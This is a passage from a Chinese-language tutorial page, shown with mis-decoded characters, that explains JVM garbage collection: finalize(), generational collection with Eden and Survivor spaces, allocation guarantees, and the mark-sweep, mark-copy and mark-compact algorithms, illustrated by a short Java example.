class="line">com.test.Main$Test@232204a1</span><br></pre></td></tr></table></figure></p><p>åŒæ—¶ï¼ŒåŒä¸€ä¸ªå¯¹è±¡çš„<code>finalize()</code>æ–¹æ³•åªä¼šæœ‰ä¸€æ¬¡è°ƒç”¨æœºä¼šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬è¿ç»­ä¸¤æ¬¡è¿™æ ·æ“ä½œï¼Œé‚£ä¹ˆç¬¬äºŒæ¬¡ï¼Œå¯¹è±¡å¿…å®šè¢«å›æ”¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    a = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="comment">//è¿™é‡Œç›´æ¥æŠŠaèµ‹å€¼ä¸ºnullï¼Œè¿™æ ·å‰é¢çš„å¯¹è±¡æˆ‘ä»¬ä¸å¯èƒ½å†å¾—åˆ°äº†</span></span><br><span class="line">    a  = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//æ‰‹åŠ¨ç”³è¯·æ‰§è¡Œåƒåœ¾å›æ”¶æ“ä½œï¼ˆæ³¨æ„åªæ˜¯ç”³è¯·ï¼Œå¹¶ä¸ä¸€å®šä¼šæ‰§è¡Œï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹éƒ½ä¼šæ‰§è¡Œï¼‰</span></span><br><span class="line">    System.gc();</span><br><span class="line">    <span class="comment">//ç­‰åƒåœ¾å›æ”¶ä¸€ä¸‹</span></span><br><span class="line">    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    </span><br><span class="line">    System.out.println(a);</span><br><span class="line">    <span class="comment">//è¿™é‡Œç›´æ¥æŠŠaèµ‹å€¼ä¸ºnullï¼Œè¿™æ ·å‰é¢çš„å¯¹è±¡æˆ‘ä»¬ä¸å¯èƒ½å†å¾—åˆ°äº†</span></span><br><span class="line">    a  = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//æ‰‹åŠ¨ç”³è¯·æ‰§è¡Œåƒåœ¾å›æ”¶æ“ä½œï¼ˆæ³¨æ„åªæ˜¯ç”³è¯·ï¼Œå¹¶ä¸ä¸€å®šä¼šæ‰§è¡Œï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹éƒ½ä¼šæ‰§è¡Œï¼‰</span></span><br><span class="line">    System.gc();</span><br><span class="line">    <span class="comment">//ç­‰åƒåœ¾å›æ”¶ä¸€ä¸‹</span></span><br><span class="line">    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    </span><br><span class="line">    System.out.println(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œ<code>finalize()</code>æ–¹æ³•ä¹Ÿå¹¶ä¸æ˜¯ä¸“é—¨é˜²æ­¢å¯¹è±¡è¢«å›æ”¶çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥é‡Šæ”¾ä¸€äº›ç¨‹åºä½¿ç”¨ä¸­çš„èµ„æºç­‰ã€‚</p><p>æœ€åï¼Œæ€»ç»“æˆä¸€å¼ å›¾ï¼š</p><p><img src="https://pb01.s3.bitiful.net/113.png" alt="avatar"></p><p>å½“ç„¶ï¼Œé™¤äº†å †ä¸­çš„å¯¹è±¡ä»¥å¤–ï¼Œæ–¹æ³•åŒºä¸­çš„æ•°æ®ä¹Ÿæ˜¯å¯ä»¥è¢«åƒåœ¾å›æ”¶çš„ï¼Œä½†æ˜¯å›æ”¶æ¡ä»¶æ¯”è¾ƒä¸¥æ ¼ï¼Œè¿™é‡Œå°±æš‚æ—¶ä¸è°ˆäº†ã€‚</p><hr><h3 id="åƒåœ¾å›æ”¶ç®—æ³•"><a href="#åƒåœ¾å›æ”¶ç®—æ³•" class="headerlink" title="åƒåœ¾å›æ”¶ç®—æ³•"></a>åƒåœ¾å›æ”¶ç®—æ³•</h3><p>å‰é¢æˆ‘ä»¬ä»‹ç»äº†å¯¹è±¡å­˜æ´»åˆ¤å®šç®—æ³•ï¼Œç°åœ¨æˆ‘ä»¬å·²ç»å¯ä»¥å‡†ç¡®åœ°çŸ¥é“å †ä¸­çš„å“ªäº›å¯¹è±¡å¯ä»¥è¢«å›æ”¶äº†ï¼Œé‚£ä¹ˆï¼Œæ¥ä¸‹æ¥å°±è¯¥è€ƒè™‘å¦‚ä½•å¯¹å¯¹è±¡è¿›è¡Œå›æ”¶äº†ï¼Œåƒåœ¾æ”¶é›†å™¨ä¼šä¸å®šæœŸåœ°æ£€æŸ¥å †ä¸­çš„å¯¹è±¡ï¼ŒæŸ¥çœ‹å®ƒä»¬æ˜¯å¦æ»¡è¶³è¢«å›æ”¶çš„æ¡ä»¶ã€‚æˆ‘ä»¬è¯¥å¦‚ä½•å¯¹è¿™äº›å¯¹è±¡è¿›è¡Œå›æ”¶ï¼Œæ˜¯ä¸€ä¸ªä¸€ä¸ªåˆ¤æ–­æ˜¯å¦éœ€è¦å›æ”¶å—ï¼Ÿ</p><h4 id="åˆ†ä»£æ”¶é›†æœºåˆ¶"><a href="#åˆ†ä»£æ”¶é›†æœºåˆ¶" class="headerlink" title="åˆ†ä»£æ”¶é›†æœºåˆ¶"></a>åˆ†ä»£æ”¶é›†æœºåˆ¶</h4><p>å®é™…ä¸Šï¼Œå¦‚æœæˆ‘ä»¬å¯¹å †ä¸­çš„æ¯ä¸€ä¸ªå¯¹è±¡éƒ½ä¾æ¬¡åˆ¤æ–­æ˜¯å¦éœ€è¦å›æ”¶ï¼Œè¿™æ ·çš„æ•ˆç‡å…¶å®æ˜¯å¾ˆä½çš„ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰æ›´å¥½åœ°å›æ”¶æœºåˆ¶å‘¢ï¼Ÿç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å †ä¸­çš„å¯¹è±¡è¿›è¡Œåˆ†ä»£ç®¡ç†ã€‚</p><p>æ¯”å¦‚æŸäº›å¯¹è±¡ï¼Œåœ¨å¤šæ¬¡åƒåœ¾å›æ”¶æ—¶ï¼Œéƒ½æœªè¢«åˆ¤å®šä¸ºå¯å›æ”¶å¯¹è±¡ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥å°†è¿™ä¸€éƒ¨åˆ†å¯¹è±¡æ”¾åœ¨ä¸€èµ·ï¼Œå¹¶è®©åƒåœ¾æ”¶é›†å™¨å‡å°‘å›æ”¶æ­¤åŒºåŸŸå¯¹è±¡çš„é¢‘ç‡ï¼Œè¿™æ ·å°±èƒ½å¾ˆå¥½åœ°æé«˜åƒåœ¾å›æ”¶çš„æ•ˆç‡äº†ã€‚</p><p>å› æ­¤ï¼ŒJavaè™šæ‹Ÿæœºå°†å †å†…å­˜åˆ’åˆ†ä¸º<strong>æ–°ç”Ÿä»£</strong>ã€<strong>è€å¹´ä»£</strong>å’Œ<strong>æ°¸ä¹…ä»£</strong>ï¼ˆå…¶ä¸­æ°¸ä¹…ä»£æ˜¯HotSpotè™šæ‹Ÿæœºç‰¹æœ‰çš„æ¦‚å¿µï¼Œåœ¨JDK8ä¹‹å‰æ–¹æ³•åŒºå®é™…ä¸Šå°±æ˜¯é‡‡ç”¨çš„æ°¸ä¹…ä»£ä½œä¸ºå®ç°ï¼Œè€Œåœ¨JDK8ä¹‹åï¼Œæ–¹æ³•åŒºç”±å…ƒç©ºé—´å®ç°ï¼Œå¹¶ä¸”ä½¿ç”¨çš„æ˜¯æœ¬åœ°å†…å­˜ï¼Œå®¹é‡å¤§å°å–å†³äºç‰©ç†æœºå®é™…å¤§å°ï¼Œä¹‹åä¼šè¯¦ç»†ä»‹ç»ï¼‰è¿™é‡Œæˆ‘ä»¬ä¸»è¦è®¨è®ºçš„æ˜¯<strong>æ–°ç”Ÿä»£</strong>å’Œ<strong>è€å¹´ä»£</strong>ã€‚</p><p>ä¸åŒçš„åˆ†ä»£å†…å­˜å›æ”¶æœºåˆ¶ä¹Ÿå­˜åœ¨ä¸€äº›ä¸åŒä¹‹å¤„ï¼Œåœ¨HotSpotè™šæ‹Ÿæœºä¸­ï¼Œæ–°ç”Ÿä»£è¢«åˆ’åˆ†ä¸ºä¸‰å—ï¼Œä¸€å—è¾ƒå¤§çš„Edenç©ºé—´å’Œä¸¤å—è¾ƒå°çš„Survivorç©ºé—´ï¼Œé»˜è®¤æ¯”ä¾‹ä¸º8ï¼š1ï¼š1ï¼Œè€å¹´ä»£çš„GCè¯„ç‡ç›¸å¯¹è¾ƒä½ï¼Œæ°¸ä¹…ä»£ä¸€èˆ¬å­˜æ”¾ç±»ä¿¡æ¯ç­‰ï¼ˆå…¶å®å°±æ˜¯æ–¹æ³•åŒºçš„å®ç°ï¼‰å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="https://pb01.s3.bitiful.net/114.png" alt="avatar"></p><p>é‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•è¿ä½œçš„å‘¢ï¼Ÿ</p><p>é¦–å…ˆï¼Œæ‰€æœ‰æ–°åˆ›å»ºçš„å¯¹è±¡ï¼Œåœ¨ä¸€å¼€å§‹éƒ½ä¼šè¿›å…¥åˆ°æ–°ç”Ÿä»£çš„EdenåŒºï¼ˆå¦‚æœæ˜¯å¤§å¯¹è±¡ä¼šè¢«ç›´æ¥ä¸¢è¿›è€å¹´ä»£ï¼‰ï¼Œåœ¨è¿›è¡Œæ–°ç”Ÿä»£åŒºåŸŸçš„åƒåœ¾å›æ”¶æ—¶ï¼Œé¦–å…ˆä¼šå¯¹æ‰€æœ‰æ–°ç”Ÿä»£åŒºåŸŸçš„å¯¹è±¡è¿›è¡Œæ‰«æï¼Œå¹¶å›æ”¶é‚£äº›ä¸å†ä½¿ç”¨å¯¹è±¡ï¼š</p><p><img src="https://pb01.s3.bitiful.net/115.png" alt="avatar"></p><p>æ¥ç€ï¼Œåœ¨ä¸€æ¬¡åƒåœ¾å›æ”¶ä¹‹åï¼ŒEdenåŒºåŸŸæ²¡æœ‰è¢«å›æ”¶çš„å¯¹è±¡ï¼Œä¼šè¿›å…¥åˆ°SurvivoråŒºã€‚åœ¨ä¸€å¼€å§‹Fromå’ŒToéƒ½æ˜¯ç©ºçš„ï¼Œè€ŒGCä¹‹åï¼Œæ‰€æœ‰EdenåŒºåŸŸå­˜æ´»çš„å¯¹è±¡éƒ½ä¼šç›´æ¥è¢«æ”¾å…¥åˆ°FromåŒºï¼Œæœ€åFromå’ŒToä¼šå‘ç”Ÿä¸€æ¬¡äº¤æ¢ï¼Œä¹Ÿå°±æ˜¯è¯´ç›®å‰å­˜æ”¾æˆ‘ä»¬å¯¹è±¡çš„FromåŒºï¼Œå˜ä¸ºToåŒºï¼Œè€ŒToåŒºå˜ä¸ºFromåŒºï¼š</p><p><img src="https://pb01.s3.bitiful.net/116.png" alt="avatar"></p><p>æ¥ç€å°±æ˜¯ä¸‹ä¸€æ¬¡åƒåœ¾å›æ”¶äº†ï¼Œæ“ä½œä¸ä¸Šé¢æ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡è¿™æ—¶ç”±äºæˆ‘ä»¬FromåŒºåŸŸä¸­å·²ç»å­˜åœ¨å¯¹è±¡äº†ï¼Œæ‰€ä»¥ï¼Œåœ¨EdenåŒºçš„å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°FromåŒºä¹‹åï¼Œæ‰€æœ‰ToåŒºåŸŸä¸­çš„å¯¹è±¡ä¼šè¿›è¡Œå¹´é¾„åˆ¤å®šï¼ˆæ¯ç»å†ä¸€è½®GCå¹´é¾„<code>+1</code>ï¼Œå½“å¹´é¾„å¤§å°è¶…è¿‡äº† survivor åŒºçš„ä¸€åŠæ—¶ï¼Œå–è¿™ä¸ªå¹´é¾„å’Œ MaxTenuringThreshold ä¸­æ›´å°çš„ä¸€ä¸ªå€¼ï¼Œä½œä¸ºæ–°çš„æ™‹å‡åˆ°è€å¹´ä»£çš„å¹´é¾„é˜ˆå€¼ï¼Œå¤§äºè¿™ä¸ªé˜ˆå€¼çš„è¯,ä¼šç›´æ¥è¿›å…¥åˆ°è€å¹´ä»£ï¼Œå¦åˆ™ç§»åŠ¨åˆ°FromåŒºï¼‰</p><p><img src="https://pb01.s3.bitiful.net/117.png" alt="avatar"></p><p>æœ€ååƒä¸Šé¢ä¸€æ ·äº¤æ¢ToåŒºå’ŒFromåŒºï¼Œä¹‹åä¸æ–­é‡å¤ä»¥ä¸Šæ­¥éª¤ã€‚</p><h4 id="ç©ºé—´åˆ†é…æ‹…ä¿"><a href="#ç©ºé—´åˆ†é…æ‹…ä¿" class="headerlink" title="ç©ºé—´åˆ†é…æ‹…ä¿"></a>ç©ºé—´åˆ†é…æ‹…ä¿</h4><p>æˆ‘ä»¬å¯ä»¥æ€è€ƒä¸€ä¸‹ï¼Œæœ‰æ²¡æœ‰è¿™æ ·ä¸€ç§æç«¯æƒ…å†µï¼ˆæ­£å¸¸æƒ…å†µä¸‹æ–°ç”Ÿä»£çš„å›æ”¶ç‡æ˜¯å¾ˆé«˜çš„ï¼Œæ‰€ä»¥è¯´ä¸ç”¨å¤ªæ‹…å¿ƒä¼šç»å¸¸å‡ºç°è¿™ç§é—®é¢˜ï¼‰ï¼Œåœ¨ä¸€æ¬¡GCåï¼Œæ–°ç”Ÿä»£EdenåŒºä»ç„¶å­˜åœ¨å¤§é‡çš„å¯¹è±¡ï¼ˆå› ä¸ºGCä¹‹åå­˜æ´»å¯¹è±¡ä¼šè¿›å…¥åˆ°ä¸€ä¸ªSurvivoråŒºï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾è¿™æ—¶å·²ç»è¶…å‡ºSurvivoråŒºçš„å®¹é‡äº†ï¼Œè‚¯å®šæ˜¯è£…ä¸ä¸‹çš„ï¼‰é‚£ä¹ˆç°åœ¨è¯¥æ€ä¹ˆåŠï¼Ÿ</p><p>è¿™æ—¶å°±éœ€è¦ç”¨åˆ°ç©ºé—´åˆ†é…æ‹…ä¿æœºåˆ¶äº†ï¼Œå¯ä»¥æŠŠSurvivoråŒºæ— æ³•å®¹çº³çš„å¯¹è±¡ç›´æ¥é€åˆ°è€å¹´ä»£ï¼Œè®©è€å¹´ä»£è¿›è¡Œåˆ†é…æ‹…ä¿ï¼ˆå½“ç„¶è€å¹´ä»£ä¹Ÿå¾—è£…å¾—ä¸‹æ‰è¡Œï¼‰ã€‚å½“æ–°ç”Ÿä»£æ— æ³•å®¹çº³æ›´å¤šçš„çš„å¯¹è±¡æ—¶ï¼Œå¯ä»¥æŠŠæ–°ç”Ÿä»£ä¸­çš„å¯¹è±¡ç§»åŠ¨åˆ°è€å¹´ä»£ä¸­ï¼Œè¿™æ ·æ–°ç”Ÿä»£å°±è…¾å‡ºäº†ç©ºé—´æ¥å®¹çº³æ›´å¤šçš„å¯¹è±¡ã€‚</p><p>å¥½ï¼Œé‚£æ—¢ç„¶æ–°ç”Ÿä»£è£…ä¸ä¸‹å°±ä¸¢ç»™è€å¹´ä»£ï¼Œé‚£ä¹ˆè¦æ˜¯è€å¹´ä»£ä¹Ÿè£…ä¸ä¸‹æ–°ç”Ÿä»£çš„æ•°æ®å‘¢ï¼Ÿè¿™æ—¶ï¼Œè€å¹´ä»£è‚¯å®šæ‹…ä¿äººæ˜¯å½“ä¸æˆäº†ï¼Œé‚£ä¹ˆè¿™æ ·çš„è¯ï¼Œé¦–å…ˆä¼šåˆ¤æ–­ä¸€ä¸‹ä¹‹å‰çš„æ¯æ¬¡åƒåœ¾å›æ”¶è¿›å…¥è€å¹´ä»£çš„å¹³å‡å¤§å°æ˜¯å¦å°äºå½“å‰è€å¹´ä»£çš„å‰©ä½™ç©ºé—´ï¼Œå¦‚æœå°äºï¼Œé‚£ä¹ˆè¯´æ˜ä¹Ÿè®¸å¯ä»¥æ”¾å¾—ä¸‹ï¼ˆä¸è¿‡ä¹Ÿä»…ä»…æ˜¯ä¹Ÿè®¸ï¼Œä¾ç„¶æœ‰å¯èƒ½æ”¾ä¸ä¸‹ï¼Œå› ä¸ºåˆ¤æ–­çš„å®é™…ä¸Šåªæ˜¯å¹³å‡å€¼ï¼Œä¸‡ä¸€è¿™ä¸€æ¬¡çªç„¶éå¸¸å¤§å‘¢ï¼‰ï¼Œå¦åˆ™ï¼Œä¼šå…ˆæ¥ä¸€æ¬¡Full GCï¼Œè¿›è¡Œä¸€æ¬¡å¤§è§„æ¨¡åƒåœ¾å›æ”¶ï¼Œæ¥å°è¯•è…¾å‡ºç©ºé—´ï¼Œå†æ¬¡åˆ¤æ–­è€å¹´ä»£æ˜¯å¦æœ‰ç©ºé—´å­˜æ”¾ï¼Œè¦æ˜¯è¿˜æ˜¯è£…ä¸ä¸‹ï¼Œç›´æ¥æŠ›å‡ºOOMé”™è¯¯ï¼Œæ‘†çƒ‚ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬æ¥æ€»ç»“ä¸€ä¸‹ä¸€æ¬¡Minor GCçš„æ•´ä¸ªè¿‡ç¨‹ï¼š</p><p><img src="https://pb01.s3.bitiful.net/118.png" alt="avatar"></p><hr><h4 id="æ ‡è®°-æ¸…é™¤ç®—æ³•"><a href="#æ ‡è®°-æ¸…é™¤ç®—æ³•" class="headerlink" title="æ ‡è®°-æ¸…é™¤ç®—æ³•"></a>æ ‡è®°-æ¸…é™¤ç®—æ³•</h4><p>å‰é¢æˆ‘ä»¬å·²ç»äº†è§£äº†æ•´ä¸ªå †å†…å­˜å®é™…ä¸Šæ˜¯ä»¥åˆ†ä»£æ”¶é›†æœºåˆ¶ä¸ºä¸»ï¼Œä½†æ˜¯ä¾ç„¶æ²¡æœ‰è®²åˆ°å…·ä½“çš„æ”¶é›†è¿‡ç¨‹ï¼Œé‚£ä¹ˆï¼Œå…·ä½“çš„å›æ”¶è¿‡ç¨‹åˆæ˜¯ä»€ä¹ˆæ ·çš„å‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹æœ€å¤è€çš„<code>æ ‡è®°-æ¸…é™¤</code>ç®—æ³•ã€‚</p><p>é¦–å…ˆæ ‡è®°å‡ºæ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡ï¼Œç„¶åå†ä¾æ¬¡å›æ”¶æ‰è¢«æ ‡è®°çš„å¯¹è±¡ï¼Œæˆ–æ˜¯æ ‡è®°å‡ºæ‰€æœ‰ä¸éœ€è¦å›æ”¶çš„å¯¹è±¡ï¼Œåªå›æ”¶æœªæ ‡è®°çš„å¯¹è±¡ã€‚</p><p>å¦‚æœæŒ‰ç…§å‰è€…çš„ç†è§£ï¼Œæ•´ä¸ªæ ‡è®°-æ¸…é™¤è¿‡ç¨‹å¤§è‡´æ˜¯è¿™æ ·çš„ï¼š</p><ol><li>å½“ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œç»™ä¸€ä¸ªæ ‡è®°ä½ï¼Œå‡è®¾ä¸º 0 (false)ï¼›</li><li>åœ¨æ ‡è®°é˜¶æ®µï¼Œæˆ‘ä»¬å°†æ‰€æœ‰å¯è¾¾å¯¹è±¡ï¼ˆæˆ–ç”¨æˆ·å¯ä»¥å¼•ç”¨çš„å¯¹è±¡ï¼‰çš„æ ‡è®°ä½è®¾ç½®ä¸º 1 (true)ï¼›</li><li>æ‰«æé˜¶æ®µæ¸…é™¤çš„å°±æ˜¯æ ‡è®°ä½ä¸º 0 (false)çš„å¯¹è±¡ã€‚</li></ol><p><img src="https://pb01.s3.bitiful.net/119.png" alt="avatar"></p><p>è™½ç„¶æ­¤æ–¹æ³•éå¸¸ç®€å•ï¼Œä½†æ˜¯ç¼ºç‚¹ä¹Ÿæ˜¯éå¸¸æ˜æ˜¾çš„ ï¼Œé¦–å…ˆå¦‚æœå†…å­˜ä¸­å­˜åœ¨å¤§é‡çš„å¯¹è±¡ï¼Œé‚£ä¹ˆå¯èƒ½å°±ä¼šå­˜åœ¨å¤§é‡çš„æ ‡è®°ï¼Œå¹¶ä¸”å¤§è§„æ¨¡è¿›è¡Œæ¸…é™¤ã€‚å¹¶ä¸”ä¸€æ¬¡æ ‡è®°æ¸…é™¤ä¹‹åï¼Œè¿ç»­çš„å†…å­˜ç©ºé—´å¯èƒ½ä¼šå‡ºç°è®¸è®¸å¤šå¤šçš„ç©ºéš™ï¼Œç¢ç‰‡åŒ–ä¼šå¯¼è‡´è¿ç»­å†…å­˜ç©ºé—´åˆ©ç”¨ç‡é™ä½ã€‚</p><h4 id="æ ‡è®°-å¤åˆ¶ç®—æ³•"><a href="#æ ‡è®°-å¤åˆ¶ç®—æ³•" class="headerlink" title="æ ‡è®°-å¤åˆ¶ç®—æ³•"></a>æ ‡è®°-å¤åˆ¶ç®—æ³•</h4><p>æ—¢ç„¶æ ‡è®°æ¸…é™¤ç®—æ³•åœ¨é¢å¯¹å¤§é‡å¯¹è±¡æ—¶æ•ˆç‡ä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•ã€‚å®ƒå°†å®¹é‡åˆ†ä¸ºåŒæ ·å¤§å°çš„ä¸¤å—åŒºåŸŸï¼Œ</p><p>æ ‡è®°å¤åˆ¶ç®—æ³•ï¼Œå®é™…ä¸Šå°±æ˜¯å°†å†…å­˜åŒºåŸŸåˆ’åˆ†ä¸ºå¤§å°ç›¸åŒçš„ä¸¤å—åŒºåŸŸï¼Œæ¯æ¬¡åªä½¿ç”¨å…¶ä¸­çš„ä¸€å—åŒºåŸŸï¼Œæ¯æ¬¡åƒåœ¾å›æ”¶ç»“æŸåï¼Œå°†æ‰€æœ‰å­˜æ´»çš„å¯¹è±¡å…¨éƒ¨å¤åˆ¶åˆ°å¦ä¸€å—åŒºåŸŸä¸­ï¼Œå¹¶ä¸€æ¬¡æ€§æ¸…ç©ºå½“å‰åŒºåŸŸã€‚è™½ç„¶æµªè´¹äº†ä¸€äº›æ—¶é—´è¿›è¡Œå¤åˆ¶æ“ä½œï¼Œä½†æ˜¯è¿™æ ·èƒ½å¤Ÿå¾ˆå¥½åœ°è§£å†³å¯¹è±¡å¤§é¢ç§¯å›æ”¶åç©ºé—´ç¢ç‰‡åŒ–ä¸¥é‡çš„é—®é¢˜ã€‚</p><p><img src="https://pb01.s3.bitiful.net/120.png" alt="avatar"></p><p>è¿™ç§ç®—æ³•å°±éå¸¸é€‚ç”¨äºæ–°ç”Ÿä»£ï¼ˆå› ä¸ºæ–°ç”Ÿä»£çš„å›æ”¶æ•ˆç‡æé«˜ï¼Œä¸€èˆ¬ä¸ä¼šç•™ä¸‹å¤ªå¤šçš„å¯¹è±¡ï¼‰çš„åƒåœ¾å›æ”¶ï¼Œè€Œæˆ‘ä»¬ä¹‹å‰æ‰€è¯´çš„æ–°ç”Ÿä»£SurvivoråŒºå…¶å®å°±æ˜¯è¿™ä¸ªæ€è·¯ï¼ŒåŒ…æ‹¬8:1:1çš„æ¯”ä¾‹ä¹Ÿæ­£æ˜¯ä¸ºäº†å¯¹æ ‡è®°å¤åˆ¶ç®—æ³•è¿›è¡Œä¼˜åŒ–è€Œé‡‡å–çš„ã€‚</p><h4 id="æ ‡è®°-æ•´ç†ç®—æ³•"><a href="#æ ‡è®°-æ•´ç†ç®—æ³•" class="headerlink" title="æ ‡è®°-æ•´ç†ç®—æ³•"></a>æ ‡è®°-æ•´ç†ç®—æ³•</h4><p>è™½ç„¶æ ‡è®°-å¤åˆ¶ç®—æ³•èƒ½å¤Ÿå¾ˆå¥½åœ°åº”å¯¹æ–°ç”Ÿä»£é«˜å›æ”¶ç‡çš„åœºæ™¯ï¼Œä½†æ˜¯æ”¾åˆ°è€å¹´ä»£ï¼Œå®ƒå°±æ˜¾å¾—å¾ˆé¸¡è‚‹äº†ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œä¸€èˆ¬é•¿æœŸéƒ½å›æ”¶ä¸åˆ°çš„å¯¹è±¡ï¼Œæ‰æœ‰æœºä¼šè¿›å…¥åˆ°è€å¹´ä»£ï¼Œæ‰€ä»¥è€å¹´ä»£ä¸€èˆ¬éƒ½æ˜¯äº›é’‰å­æˆ·ï¼Œå¯èƒ½ä¸€æ¬¡GCåï¼Œä»ç„¶å­˜ç•™å¾ˆå¤šå¯¹è±¡ã€‚è€Œæ ‡è®°å¤åˆ¶ç®—æ³•ä¼šåœ¨GCåå®Œæ•´å¤åˆ¶æ•´ä¸ªåŒºåŸŸå†…å®¹ï¼Œå¹¶ä¸”ä¼šæŠ˜æŸ50%çš„åŒºåŸŸï¼Œæ˜¾ç„¶è¿™å¹¶ä¸é€‚ç”¨äºè€å¹´ä»£ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬èƒ½å¦è¿™æ ·ï¼Œåœ¨æ ‡è®°æ‰€æœ‰å¾…å›æ”¶å¯¹è±¡ä¹‹åï¼Œä¸æ€¥ç€å»è¿›è¡Œå›æ”¶æ“ä½œï¼Œè€Œæ˜¯å°†æ‰€æœ‰å¾…å›æ”¶çš„å¯¹è±¡æ•´é½æ’åˆ—åœ¨ä¸€æ®µå†…å­˜ç©ºé—´ä¸­ï¼Œè€Œéœ€è¦å›æ”¶çš„å¯¹è±¡å…¨éƒ¨å¾€åä¸¢ï¼Œè¿™æ ·ï¼Œå‰åŠéƒ¨åˆ†çš„æ‰€æœ‰å¯¹è±¡éƒ½æ˜¯æ— éœ€è¿›è¡Œå›æ”¶çš„ï¼Œè€ŒååŠéƒ¨åˆ†ç›´æ¥ä¸€æ¬¡æ€§æ¸…é™¤å³å¯ã€‚</p><p><img src="https://pb01.s3.bitiful.net/121.png" alt="avatar"></p><p>è™½ç„¶è¿™æ ·èƒ½ä¿è¯å†…å­˜ç©ºé—´å……åˆ†ä½¿ç”¨ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰æ ‡è®°å¤åˆ¶ç®—æ³•é‚£ä¹ˆç¹æ‚ï¼Œä½†æ˜¯ç¼ºç‚¹ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œå®ƒçš„æ•ˆç‡æ¯”å‰ä¸¤è€…éƒ½ä½ã€‚ç”šè‡³ï¼Œç”±äºéœ€è¦ä¿®æ”¹å¯¹è±¡åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œæ­¤æ—¶ç¨‹åºå¿…é¡»è¦æš‚åœæ‰å¯ä»¥ï¼Œåœ¨æç«¯æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ªç¨‹åºå‘ç”Ÿåœé¡¿ï¼ˆè¢«ç§°ä¸ºâ€œStop The Worldâ€ï¼‰ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ‡è®°æ¸…é™¤ç®—æ³•å’Œæ ‡è®°æ•´ç†ç®—æ³•æ··åˆä½¿ç”¨ï¼Œåœ¨å†…å­˜ç©ºé—´è¿˜ä¸æ˜¯å¾ˆå‡Œä¹±çš„æ—¶å€™ï¼Œé‡‡ç”¨æ ‡è®°æ¸…é™¤ç®—æ³•å…¶å®æ˜¯æ²¡æœ‰å¤šå¤§é—®é¢˜çš„ï¼Œå½“å†…å­˜ç©ºé—´å‡Œä¹±åˆ°ä¸€å®šç¨‹åº¦åï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸€æ¬¡æ ‡è®°æ•´ç†ç®—æ³•ã€‚</p><hr><h3 id="åƒåœ¾æ”¶é›†å™¨å®ç°"><a href="#åƒåœ¾æ”¶é›†å™¨å®ç°" class="headerlink" title="åƒåœ¾æ”¶é›†å™¨å®ç°"></a>åƒåœ¾æ”¶é›†å™¨å®ç°</h3><p>èŠå®Œäº†å¯¹è±¡å­˜æ´»åˆ¤å®šå’Œåƒåœ¾å›æ”¶ç®—æ³•ï¼Œæ¥ç€æˆ‘ä»¬å°±è¦çœ‹çœ‹å…·ä½“æœ‰å“ªäº›åƒåœ¾å›æ”¶å™¨çš„å®ç°äº†ã€‚æˆ‘ä»¬å¯ä»¥è‡ªç”±åœ°ä¸ºæ–°ç”Ÿä»£å’Œè€å¹´ä»£é€‰æ‹©æ›´é€‚åˆå®ƒä»¬çš„æ”¶é›†å™¨ã€‚</p><h4 id="Serialæ”¶é›†å™¨"><a href="#Serialæ”¶é›†å™¨" class="headerlink" 